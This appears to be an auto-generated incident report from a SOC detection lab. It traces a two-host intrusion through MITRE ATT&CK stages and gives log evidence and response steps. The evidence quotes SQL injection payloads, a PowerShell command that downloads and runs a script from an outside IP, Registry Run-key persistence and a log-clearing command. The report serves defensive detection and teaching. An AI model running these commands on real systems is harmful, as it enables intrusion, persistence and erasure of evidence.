# Incident Report

*Generated 2026-11-02 19:54 UTC by SOC Detection Lab. 345 events from 3 log files checked against 15 detection rules.*

## Summary

**17 alerts** between 2026-10-14 09:02:03 and 2026-10-14 10:30:45 UTC.

| Severity | Alerts |
| --- | --- |
| 🟥 Critical | 2 |
| 🟧 High | 11 |
| 🟨 Medium | 4 |

- **Affected hosts:** WS01.corp.local, web01
- **Source IPs involved:** 198.51.100.23, 203.0.113.45
- **Attack stages, in the order seen:** Reconnaissance → Initial Access → Credential Access → Persistence → Execution → Command and Control → Defense Evasion

## Attack timeline

| Time (UTC) | Severity | Host | Technique | Detection | Details |
| --- | --- | --- | --- | --- | --- |
| 2026-10-14 09:02:03 | 🟨 Medium | web01 | T1595.003 | Web directory scanning (burst of 404s) | 32 matching events (src_ip=203.0.113.45) between 09:02:03 and 09:02:40 |
| 2026-10-14 09:05:10 | 🟧 High | web01 | T1190 | SQL injection attempt in URL | src_ip=203.0.113.45 /products?id=7' OR '1'='1 |
| 2026-10-14 09:05:27 | 🟧 High | web01 | T1190 | SQL injection attempt in URL | src_ip=203.0.113.45 /products?id=7 UNION SELECT username,password FROM users-- |
| 2026-10-14 09:05:44 | 🟧 High | web01 | T1190 | SQL injection attempt in URL | src_ip=203.0.113.45 /products?id=7 AND SLEEP(5) |
| 2026-10-14 09:10:05 | 🟧 High | web01 | T1110.001 | SSH brute-force attack | 14 matching events (src_ip=203.0.113.45) between 09:10:05 and 09:11:19 |
| 2026-10-14 09:10:05 | 🟥 Critical | web01 | T1078 | Successful SSH login after brute force | 14 matching events, then ssh_success as webadmin at 09:11:52 (src_ip=203.0.113.45) |
| 2026-10-14 09:13:05 | 🟨 Medium | web01 | T1136.001 | New Linux user account created | user=sysupdate |
| 2026-10-14 09:13:21 | 🟧 High | web01 | T1098 | User added to Linux admin group | user=sysupdate group=sudo |
| 2026-10-14 10:20:02 | 🟧 High | WS01.corp.local | T1110.001 | Windows logon brute force | 12 matching events (src_ip=198.51.100.23) between 10:20:02 and 10:20:40 |
| 2026-10-14 10:20:02 | 🟥 Critical | WS01.corp.local | T1078 | Successful Windows logon after brute force | 12 matching events, then logon_success as Administrator at 10:21:20 (src_ip=198.51.100.23) |
| 2026-10-14 10:23:05 | 🟧 High | WS01.corp.local | T1059.001 | Encoded PowerShell command | user=Administrator "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -Enc dwBoAG8AY… [decoded: whoami /all; net user; net localgroup administrators] |
| 2026-10-14 10:23:41 | 🟧 High | WS01.corp.local | T1105 | PowerShell download and execute | user=Administrator "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -C "IEX (New-Object Net.… |
| 2026-10-14 10:25:03 | 🟨 Medium | WS01.corp.local | T1136.001 | New Windows user account created | user=svc_backup |
| 2026-10-14 10:25:30 | 🟧 High | WS01.corp.local | T1098 | Account added to an administrators group | user=svc_backup group=Administrators |
| 2026-10-14 10:27:12 | 🟨 Medium | WS01.corp.local | T1053.005 | Scheduled task created | user=Administrator task=\Microsoft\Windows\UpdateCheck |
| 2026-10-14 10:28:02 | 🟧 High | WS01.corp.local | T1547.001 | Registry Run key added | user=Administrator reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Use… |
| 2026-10-14 10:30:45 | 🟧 High | WS01.corp.local | T1070.001 | Security event log cleared | user=Administrator wevtutil cl Security |

## MITRE ATT&CK coverage

| Tactic | Technique | Alerts |
| --- | --- | --- |
| Reconnaissance | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) Active Scanning: Wordlist Scanning | 1 |
| Initial Access | [T1078](https://attack.mitre.org/techniques/T1078/) Valid Accounts | 2 |
| Initial Access | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing Application | 3 |
| Execution | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) Command and Scripting Interpreter: PowerShell | 1 |
| Persistence | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) Scheduled Task/Job: Scheduled Task | 1 |
| Persistence | [T1098](https://attack.mitre.org/techniques/T1098/) Account Manipulation | 2 |
| Persistence | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) Create Account: Local Account | 2 |
| Persistence | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) Boot or Logon Autostart Execution: Registry Run Keys | 1 |
| Defense Evasion | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) Indicator Removal: Clear Windows Event Logs | 1 |
| Credential Access | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) Brute Force: Password Guessing | 2 |
| Command and Control | [T1105](https://attack.mitre.org/techniques/T1105/) Ingress Tool Transfer | 1 |

## Findings

### 1. Successful SSH login after brute force

**Severity:** 🟥 Critical · **MITRE:** Initial Access / [T1078 Valid Accounts](https://attack.mitre.org/techniques/T1078/) · **Host:** web01 · **Rule:** `linux_ssh_login_after_bruteforce`

An IP that was brute-forcing SSH then logged in successfully. The password was probably guessed and the attacker now has a shell on the server.

**What happened:** 14 matching events, then ssh_success as webadmin at 09:11:52 (src_ip=203.0.113.45)

**Evidence** (15 events, 6 shown):

```
Oct 14 09:10:05 web01 sshd[2001]: Failed password for root from 203.0.113.45 port 40000 ssh2
Oct 14 09:10:12 web01 sshd[2002]: Failed password for invalid user admin from 203.0.113.45 port 40007 ssh2
Oct 14 09:10:20 web01 sshd[2003]: Failed password for invalid user ubuntu from 203.0.113.45 port 40014 ssh2
Oct 14 09:10:28 web01 sshd[2004]: Failed password for invalid user test from 203.0.113.45 port 40021 ssh2
Oct 14 09:10:32 web01 sshd[2005]: Failed password for invalid user oracle from 203.0.113.45 port 40028 ssh2
... 9 more ...
Oct 14 09:11:52 web01 sshd[2101]: Accepted password for webadmin from 203.0.113.45 port 40214 ssh2
```

**Recommended response:**

1. Treat the host as compromised. Isolate it from the network if possible.
2. Disable the account that logged in and reset its password.
3. Review everything that account did after login (sudo, new users, cron jobs, downloads).

### 2. Successful Windows logon after brute force

**Severity:** 🟥 Critical · **MITRE:** Initial Access / [T1078 Valid Accounts](https://attack.mitre.org/techniques/T1078/) · **Host:** WS01.corp.local · **Rule:** `win_logon_after_bruteforce`

An IP that was guessing passwords then logged on successfully (event 4624). The attacker likely has valid credentials.

**What happened:** 12 matching events, then logon_success as Administrator at 10:21:20 (src_ip=198.51.100.23)

**Evidence** (13 events, 6 shown):

```
{"TimeCreated": "2026-10-14T10:20:02Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49800", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
{"TimeCreated": "2026-10-14T10:20:06Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49801", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
{"TimeCreated": "2026-10-14T10:20:09Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49802", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
{"TimeCreated": "2026-10-14T10:20:12Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49803", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
{"TimeCreated": "2026-10-14T10:20:15Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49804", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
... 7 more ...
{"TimeCreated": "2026-10-14T10:21:20Z", "EventID": 4624, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 10, "IpAddress": "198.51.100.23", "WorkstationName": "kali"}
```

**Recommended response:**

1. Disable the compromised account and reset its password.
2. Isolate the host and review processes started after the logon (4688).
3. Check other hosts for logons by the same account or IP.

### 3. SQL injection attempt in URL

**Severity:** 🟧 High · **MITRE:** Initial Access / [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · **Host:** web01 · **Rule:** `web_sqli_attempt`

A request contained SQL syntax (UNION SELECT, OR 1=1, SLEEP) in its URL. Attackers use this to read or change the database behind a website.

**What happened:** src_ip=203.0.113.45 /products?id=7' OR '1'='1

**Evidence** (1 events):

```
203.0.113.45 - - [14/Oct/2026:09:05:10 +0000] "GET /products?id=7%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 48112 "-" "sqlmap/1.8.7#stable (https://sqlmap.org)"
```

**Recommended response:**

1. Check the HTTP status and response size; a 200 with a large response may mean the injection worked.
2. Review the application's database logs for queries at the same time.
3. Block the source IP and confirm the vulnerable parameter uses parameterized queries.

### 4. SQL injection attempt in URL

**Severity:** 🟧 High · **MITRE:** Initial Access / [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · **Host:** web01 · **Rule:** `web_sqli_attempt`

A request contained SQL syntax (UNION SELECT, OR 1=1, SLEEP) in its URL. Attackers use this to read or change the database behind a website.

**What happened:** src_ip=203.0.113.45 /products?id=7 UNION SELECT username,password FROM users--

**Evidence** (1 events):

```
203.0.113.45 - - [14/Oct/2026:09:05:27 +0000] "GET /products?id=7%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 512 "-" "sqlmap/1.8.7#stable (https://sqlmap.org)"
```

**Recommended response:**

1. Check the HTTP status and response size; a 200 with a large response may mean the injection worked.
2. Review the application's database logs for queries at the same time.
3. Block the source IP and confirm the vulnerable parameter uses parameterized queries.

### 5. SQL injection attempt in URL

**Severity:** 🟧 High · **MITRE:** Initial Access / [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · **Host:** web01 · **Rule:** `web_sqli_attempt`

A request contained SQL syntax (UNION SELECT, OR 1=1, SLEEP) in its URL. Attackers use this to read or change the database behind a website.

**What happened:** src_ip=203.0.113.45 /products?id=7 AND SLEEP(5)

**Evidence** (1 events):

```
203.0.113.45 - - [14/Oct/2026:09:05:44 +0000] "GET /products?id=7%20AND%20SLEEP(5) HTTP/1.1" 200 3402 "-" "sqlmap/1.8.7#stable (https://sqlmap.org)"
```

**Recommended response:**

1. Check the HTTP status and response size; a 200 with a large response may mean the injection worked.
2. Review the application's database logs for queries at the same time.
3. Block the source IP and confirm the vulnerable parameter uses parameterized queries.

### 6. SSH brute-force attack

**Severity:** 🟧 High · **MITRE:** Credential Access / [T1110.001 Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/) · **Host:** web01 · **Rule:** `linux_ssh_bruteforce`

Many failed SSH password attempts from one IP within a few minutes, usually an automated tool guessing common usernames and passwords.

**What happened:** 14 matching events (src_ip=203.0.113.45) between 09:10:05 and 09:11:19

**Evidence** (14 events, 6 shown):

```
Oct 14 09:10:05 web01 sshd[2001]: Failed password for root from 203.0.113.45 port 40000 ssh2
Oct 14 09:10:12 web01 sshd[2002]: Failed password for invalid user admin from 203.0.113.45 port 40007 ssh2
Oct 14 09:10:20 web01 sshd[2003]: Failed password for invalid user ubuntu from 203.0.113.45 port 40014 ssh2
Oct 14 09:10:28 web01 sshd[2004]: Failed password for invalid user test from 203.0.113.45 port 40021 ssh2
Oct 14 09:10:32 web01 sshd[2005]: Failed password for invalid user oracle from 203.0.113.45 port 40028 ssh2
... 8 more ...
Oct 14 09:11:19 web01 sshd[2014]: Failed password for invalid user ftpuser from 203.0.113.45 port 40091 ssh2
```

**Recommended response:**

1. Check whether the same IP later logged in successfully (see the follow-up rule).
2. Block the IP (fail2ban, firewall) and disable SSH password login in favor of keys.
3. Confirm the targeted accounts have strong passwords.

### 7. User added to Linux admin group

**Severity:** 🟧 High · **MITRE:** Persistence / [T1098 Account Manipulation](https://attack.mitre.org/techniques/T1098/) · **Host:** web01 · **Rule:** `linux_user_added_to_sudo`

An account was added to a group that grants root access (sudo, wheel, admin).

**What happened:** user=sysupdate group=sudo

**Evidence** (1 events):

```
Oct 14 09:13:21 web01 usermod[2161]: add 'sysupdate' to group 'sudo'
```

**Recommended response:**

1. Verify the change was approved.
2. If not, remove the user from the group and lock the account.

### 8. Windows logon brute force

**Severity:** 🟧 High · **MITRE:** Credential Access / [T1110.001 Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/) · **Host:** WS01.corp.local · **Rule:** `win_bruteforce`

Many failed logons (event 4625) from one IP within a few minutes, a sign of password guessing against RDP or SMB.

**What happened:** 12 matching events (src_ip=198.51.100.23) between 10:20:02 and 10:20:40

**Evidence** (12 events, 6 shown):

```
{"TimeCreated": "2026-10-14T10:20:02Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49800", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
{"TimeCreated": "2026-10-14T10:20:06Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49801", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
{"TimeCreated": "2026-10-14T10:20:09Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49802", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
{"TimeCreated": "2026-10-14T10:20:12Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49803", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
{"TimeCreated": "2026-10-14T10:20:15Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49804", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
... 6 more ...
{"TimeCreated": "2026-10-14T10:20:40Z", "EventID": 4625, "Computer": "WS01.corp.local", "TargetUserName": "Administrator", "TargetDomainName": "WS01", "LogonType": 3, "IpAddress": "198.51.100.23", "IpPort": "49811", "Status": "0xc000006d", "SubStatus": "0xc000006a", "WorkstationName": "kali"}
```

**Recommended response:**

1. Check for a successful logon (4624) from the same IP afterwards.
2. Block the IP; RDP should never be exposed directly to the internet.
3. Confirm account lockout policy is enabled.

### 9. Encoded PowerShell command

**Severity:** 🟧 High · **MITRE:** Execution / [T1059.001 Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/) · **Host:** WS01.corp.local · **Rule:** `win_encoded_powershell`

PowerShell was started with an encoded (Base64) command. Admins rarely do this; attackers use it to hide what the command does.

**What happened:** user=Administrator "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -Enc dwBoAG8AY… [decoded: whoami /all; net user; net localgroup administrators]

**Evidence** (1 events):

```
{"TimeCreated": "2026-10-14T10:23:05Z", "EventID": 4688, "Computer": "WS01.corp.local", "SubjectUserName": "Administrator", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Windows\\explorer.exe", "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -W Hidden -Enc dwBoAG8AYQBtAGkAIAAvAGEAbABsADsAIABuAGUAdAAgAHUAcwBlAHIAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA="}
```

**Recommended response:**

1. Decode the Base64 (UTF-16LE) to see the real command.
2. Look at the parent process and the account that ran it.
3. Check for network connections or new files right after.

### 10. PowerShell download and execute

**Severity:** 🟧 High · **MITRE:** Command and Control / [T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) · **Host:** WS01.corp.local · **Rule:** `win_powershell_download_cradle`

PowerShell downloaded content from the internet and ran it in memory (IEX + DownloadString), a common way to load attack tools without saving files.

**What happened:** user=Administrator "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -C "IEX (New-Object Net.…

**Evidence** (1 events):

```
{"TimeCreated": "2026-10-14T10:23:41Z", "EventID": 4688, "Computer": "WS01.corp.local", "SubjectUserName": "Administrator", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Windows\\explorer.exe", "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -C \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\""}
```

**Recommended response:**

1. Find the URL in the command line and block that domain or IP.
2. Retrieve what was downloaded (proxy logs, EDR) to understand the tool.
3. Isolate the host.

### 11. Account added to an administrators group

**Severity:** 🟧 High · **MITRE:** Persistence / [T1098 Account Manipulation](https://attack.mitre.org/techniques/T1098/) · **Host:** WS01.corp.local · **Rule:** `win_added_to_admin_group`

An account was added to a privileged group (event 4732), giving it admin rights.

**What happened:** user=svc_backup group=Administrators

**Evidence** (1 events):

```
{"TimeCreated": "2026-10-14T10:25:30Z", "EventID": 4732, "Computer": "WS01.corp.local", "SubjectUserName": "Administrator", "TargetUserName": "Administrators", "MemberName": "svc_backup", "MemberSid": "S-1-5-21-1004336348-1177238915-682003330-1013"}
```

**Recommended response:**

1. Verify the change against an approved request.
2. If unapproved, remove the member and disable the account.

### 12. Registry Run key added

**Severity:** 🟧 High · **MITRE:** Persistence / [T1547.001 Boot or Logon Autostart Execution: Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/) · **Host:** WS01.corp.local · **Rule:** `win_run_key_persistence`

A program was added to a Registry Run key, so it starts every time the user logs on.

**What happened:** user=Administrator reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Use…

**Evidence** (1 events):

```
{"TimeCreated": "2026-10-14T10:28:02Z", "EventID": 4688, "Computer": "WS01.corp.local", "SubjectUserName": "Administrator", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\reg.exe", "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\Public\\upd.exe /f"}
```

**Recommended response:**

1. Check the value's target file; remove the Run value and the file if malicious.
2. Look for the same value on other hosts.

### 13. Security event log cleared

**Severity:** 🟧 High · **MITRE:** Defense Evasion / [T1070.001 Indicator Removal: Clear Windows Event Logs](https://attack.mitre.org/techniques/T1070/001/) · **Host:** WS01.corp.local · **Rule:** `win_security_log_cleared`

Someone cleared the Windows Security log with wevtutil. Attackers do this to erase evidence of what they did.

**What happened:** user=Administrator wevtutil cl Security

**Evidence** (1 events):

```
{"TimeCreated": "2026-10-14T10:30:45Z", "EventID": 4688, "Computer": "WS01.corp.local", "SubjectUserName": "Administrator", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\wevtutil.exe", "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "wevtutil cl Security"}
```

**Recommended response:**

1. Assume the attacker had admin rights; escalate the incident.
2. Recover logs from a central SIEM or log forwarder, which the attacker could not clear.

### 14. Web directory scanning (burst of 404s)

**Severity:** 🟨 Medium · **MITRE:** Reconnaissance / [T1595.003 Active Scanning: Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003/) · **Host:** web01 · **Rule:** `web_scanning_404_burst`

One IP requested many pages that do not exist in a short time. This is typical of automated tools (gobuster, dirb, Nikto) hunting for admin panels, backups and config files before an attack.

**What happened:** 32 matching events (src_ip=203.0.113.45) between 09:02:03 and 09:02:40

**Evidence** (32 events, 6 shown):

```
203.0.113.45 - - [14/Oct/2026:09:02:03 +0000] "GET /admin HTTP/1.1" 404 162 "-" "gobuster/3.6"
203.0.113.45 - - [14/Oct/2026:09:02:03 +0000] "GET /administrator HTTP/1.1" 404 162 "-" "gobuster/3.6"
203.0.113.45 - - [14/Oct/2026:09:02:05 +0000] "GET /wp-admin HTTP/1.1" 404 162 "-" "gobuster/3.6"
203.0.113.45 - - [14/Oct/2026:09:02:06 +0000] "GET /wp-login.php HTTP/1.1" 404 162 "-" "gobuster/3.6"
203.0.113.45 - - [14/Oct/2026:09:02:07 +0000] "GET /phpmyadmin HTTP/1.1" 404 162 "-" "gobuster/3.6"
... 26 more ...
203.0.113.45 - - [14/Oct/2026:09:02:40 +0000] "GET /error.log HTTP/1.1" 404 162 "-" "gobuster/3.6"
```

**Recommended response:**

1. Check what else this IP did (SQL injection attempts, logins) in the same window.
2. Block the IP at the firewall or WAF if it is not a known scanner you authorized.
3. Review which paths returned 200 to the same IP; those are what the attacker found.

### 15. New Linux user account created

**Severity:** 🟨 Medium · **MITRE:** Persistence / [T1136.001 Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/) · **Host:** web01 · **Rule:** `linux_user_created`

A local user account was created. Attackers add accounts to keep access even if the original password is changed.

**What happened:** user=sysupdate

**Evidence** (1 events):

```
Oct 14 09:13:05 web01 useradd[2151]: new user: name=sysupdate, UID=1003, GID=1003, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1
```

**Recommended response:**

1. Confirm with the system owner that the account was expected.
2. If not, lock the account (usermod -L) and investigate who created it.

### 16. New Windows user account created

**Severity:** 🟨 Medium · **MITRE:** Persistence / [T1136.001 Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/) · **Host:** WS01.corp.local · **Rule:** `win_user_created`

A user account was created (event 4720). Attackers create accounts to keep access to a system.

**What happened:** user=svc_backup

**Evidence** (1 events):

```
{"TimeCreated": "2026-10-14T10:25:03Z", "EventID": 4720, "Computer": "WS01.corp.local", "SubjectUserName": "Administrator", "TargetUserName": "svc_backup", "TargetDomainName": "WS01"}
```

**Recommended response:**

1. Confirm the account was expected and who created it (SubjectUserName).
2. If not, disable it and investigate the creating account.

### 17. Scheduled task created

**Severity:** 🟨 Medium · **MITRE:** Persistence / [T1053.005 Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) · **Host:** WS01.corp.local · **Rule:** `win_scheduled_task_created`

A scheduled task was registered (event 4698). Attackers use tasks to rerun their tools at logon or on a timer.

**What happened:** user=Administrator task=\Microsoft\Windows\UpdateCheck

**Evidence** (1 events):

```
{"TimeCreated": "2026-10-14T10:27:12Z", "EventID": 4698, "Computer": "WS01.corp.local", "SubjectUserName": "Administrator", "TaskName": "\\Microsoft\\Windows\\UpdateCheck", "TaskContent": "C:\\Users\\Public\\upd.exe (trigger: at logon)"}
```

**Recommended response:**

1. Review the task's action (what it runs) and who created it.
2. Delete the task if it is malicious and remove the file it runs.
